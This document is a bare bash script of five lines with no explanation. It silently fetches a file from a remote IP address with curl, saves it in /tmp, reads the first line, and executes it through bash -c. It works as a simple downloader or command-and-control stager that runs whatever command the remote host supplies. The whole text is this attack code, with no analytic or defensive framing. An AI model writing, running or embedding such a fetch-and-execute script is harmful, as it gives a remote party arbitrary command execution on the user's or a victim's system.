#!/bin/bash
curl -s http://203.0.113.5/c -o /tmp/c
c=echo
read -r c </tmp/c
bash -c "$c"
